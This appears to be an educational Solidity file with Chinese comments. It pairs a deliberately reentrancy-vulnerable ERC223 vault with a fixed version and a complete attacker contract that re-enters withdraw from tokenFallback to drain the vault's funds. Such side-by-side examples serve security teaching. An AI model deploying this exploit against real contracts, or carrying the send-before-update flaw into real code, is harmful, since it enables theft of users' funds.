// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.4.26;    

import {VulnERC223Token, IERC223Receiver} from "./VulnERC223Token.sol";

/**
 * @title VulnerableVault
 * @notice 易受重入攻击的保险库合约
 * @dev VULNERABILITY: 在withdraw函数中，先转账再更新状态
 *      攻击者可以在tokenFallback中重入withdraw函数，导致重复提取
 */
contract VulnerableVault is IERC223Receiver {
    VulnERC223Token public token;
    mapping(address => uint256) public deposits;
    uint256 public totalDeposits;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    event TokensReceived(address indexed from, uint256 amount);
    
    constructor(address _token) {
        token = VulnERC223Token(_token);
    }
    
    /**
     * @notice 存款函数
     * @dev 用户将代币转入此合约
     */
    function deposit(uint256 amount) external {
        require(amount > 0, "Amount must be greater than 0");
        require(token.balanceOf(msg.sender) >= amount, "Insufficient balance");
        
        // 使用transfer将代币转入此合约
        // 这会触发tokenFallback
        token.transferFrom(msg.sender, address(this), amount, "");
        
        // 更新存款记录
        deposits[msg.sender] += amount;
        totalDeposits += amount;
        
        emit Deposit(msg.sender, amount);
    }
    
    /**
     * @notice ERC223的tokenFallback函数
     * @dev 当收到代币时调用
     */
    function tokenFallback(address from, uint256 value, bytes calldata /*data*/) external {
        require(msg.sender == address(token), "Only token contract can call");
        emit TokensReceived(from, value);
        // VULNERABILITY: 这里没有更新deposits，因为deposit函数会在transfer后更新
        // 但如果攻击者在tokenFallback中重入，可能会出现问题
    }
    
    /**
     * @notice 提取函数 - 易受重入攻击
     * @dev VULNERABILITY: 先转账再更新状态，允许重入攻击
     *      攻击流程：
     *      1. 攻击者调用withdraw
     *      2. 合约调用token.transfer(attacker, amount)
     *      3. token.transfer会调用attacker的tokenFallback
     *      4. 在tokenFallback中，攻击者再次调用withdraw
     *      5. 由于deposits[attacker]还没有被更新，可以再次提取
     *      6. 重复此过程，直到合约余额耗尽
     */
    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "Insufficient deposit");
        require(token.balanceOf(address(this)) >= amount, "Vault insufficient balance");
        
        // VULNERABILITY: 先转账，再更新状态
        // 这允许攻击者在tokenFallback中重入withdraw函数
        token.transfer(msg.sender, amount, "");
        
        // 状态更新在转账之后，允许重入攻击
        deposits[msg.sender] -= amount;
        totalDeposits -= amount;
        
        emit Withdraw(msg.sender, amount);
    }
    
    /**
     * @notice 获取用户存款余额
     */
    function getDeposit(address user) external view returns (uint256) {
        return deposits[user];
    }
    
    /**
     * @notice 获取合约代币余额
     */
    function getBalance() external view returns (uint256) {
        return token.balanceOf(address(this));
    }
}

/**
 * @title SafeVault
 * @notice 安全版本的保险库合约，防止重入攻击
 */
contract SafeVault is IERC223Receiver {
    VulnERC223Token public token;
    mapping(address => uint256) public deposits;
    uint256 public totalDeposits;
    bool private locked; // 重入锁
    
    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    event TokensReceived(address indexed from, uint256 amount);
    
    constructor(address _token) {
        token = VulnERC223Token(_token);
    }
    
    /**
     * @notice 存款函数
     */
    function deposit(uint256 amount) external {
        require(amount > 0, "Amount must be greater than 0");
        require(token.balanceOf(msg.sender) >= amount, "Insufficient balance");
        
        token.transferFrom(msg.sender, address(this), amount, "");
        
        deposits[msg.sender] += amount;
        totalDeposits += amount;
        
        emit Deposit(msg.sender, amount);
    }
    
    /**
     * @notice ERC223的tokenFallback函数
     */
    function tokenFallback(address from, uint256 value, bytes calldata /*data*/) external {
        require(msg.sender == address(token), "Only token contract can call");
        emit TokensReceived(from, value);
    }
    
    /**
     * @notice 安全的提取函数
     * @dev MITIGATION: 使用重入锁和先更新状态再转账的模式
     */
    function withdraw(uint256 amount) external {
        require(!locked, "ReentrancyGuard: reentrant call");
        require(deposits[msg.sender] >= amount, "Insufficient deposit");
        require(token.balanceOf(address(this)) >= amount, "Vault insufficient balance");
        
        // MITIGATION: 先更新状态
        deposits[msg.sender] -= amount;
        totalDeposits -= amount;
        
        // MITIGATION: 使用重入锁
        locked = true;
        
        // 然后转账
        token.transfer(msg.sender, amount, "");
        
        // 释放锁
        locked = false;
        
        emit Withdraw(msg.sender, amount);
    }
    
    /**
     * @notice 获取用户存款余额
     */
    function getDeposit(address user) external view returns (uint256) {
        return deposits[user];
    }
    
    /**
     * @notice 获取合约代币余额
     */
    function getBalance() external view returns (uint256) {
        return token.balanceOf(address(this));
    }
}

/**
 * @title ReentrancyAttacker
 * @notice 重入攻击合约
 * @dev 利用VulnerableVault的withdraw函数中的重入漏洞
 */
contract ReentrancyAttacker is IERC223Receiver {
    VulnerableVault public target;
    VulnERC223Token public token;
    address public attacker;
    uint256 public attackCount;
    uint256 public maxAttacks;
    
    event AttackStep(uint256 step, string message);
    event Attacker(address indexed attacker, string message);

    constructor(address _target, address _token)public {
        target = VulnerableVault(_target);
        token = VulnERC223Token(_token);
        attacker = msg.sender;
        maxAttacks = 10; // 最大攻击次数，防止gas耗尽
    }
    
    /**
     * @notice 执行攻击
     * @dev 1. 先存款（通过transfer将代币转入目标合约）
     *      2. 调用withdraw
     *      3. 在tokenFallback中重入withdraw
     */
    function attack() external {
        emit Attacker(msg.sender, "sender");
        emit Attacker(attacker, "Attacker");
        require(msg.sender == attacker, "Only attacker");
        
        uint256 depositAmount = token.balanceOf(address(this));
        require(depositAmount > 0, "Need tokens to attack");
        
        // 先存款：直接调用deposit，这会使用transfer将代币转入目标合约
        // 这会触发目标合约的tokenFallback，但不会触发我们的tokenFallback
        token.approve(address(target), depositAmount);
        target.deposit(depositAmount);
        
        // 验证存款成功
        uint256 withdrawAmount = target.getDeposit(address(this));
        require(withdrawAmount > 0, "No deposit to withdraw");
        
        // 开始攻击：提取所有存款
        // 这会触发我们的tokenFallback，在tokenFallback中重入withdraw
        attackCount = 0;
        emit AttackStep(0, "withdraw");
        target.withdraw(withdrawAmount);
    }
    
    /**
     * @notice tokenFallback - 重入攻击的关键
     * @dev 当收到代币时，再次调用withdraw进行重入攻击
     */
    function tokenFallback(address from, uint256, bytes calldata /*data*/) external {
        require(msg.sender == address(token), "Only token contract can call");
        
        // 检查是否是从目标合约转来的代币
        if (from == address(target)) {
            attackCount++;
            emit AttackStep(attackCount, "Reentrancy attack step");
            
            // 重入攻击：再次调用withdraw
            // 由于VulnerableVault先转账再更新状态，此时deposits还没有被更新
            // 所以可以再次提取
            if (attackCount < maxAttacks) {
                uint256 remainingDeposit = target.getDeposit(address(this));
                uint256 vaultBalance = target.getBalance();
                
                // 如果还有存款且保险库有余额，继续攻击
                if (remainingDeposit > 0 && vaultBalance > 0) {
                    // 提取剩余存款或保险库余额中的较小值
                    uint256 withdrawAmount = remainingDeposit < vaultBalance ? remainingDeposit : vaultBalance;
                    target.withdraw(withdrawAmount);
                }
            }
        }
    }
    
    /**
     * @notice 提取攻击获得的代币
     */
    function withdraw() external {
        require(msg.sender == attacker, "Only attacker");
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(attacker, balance, "");
        }
    }
}

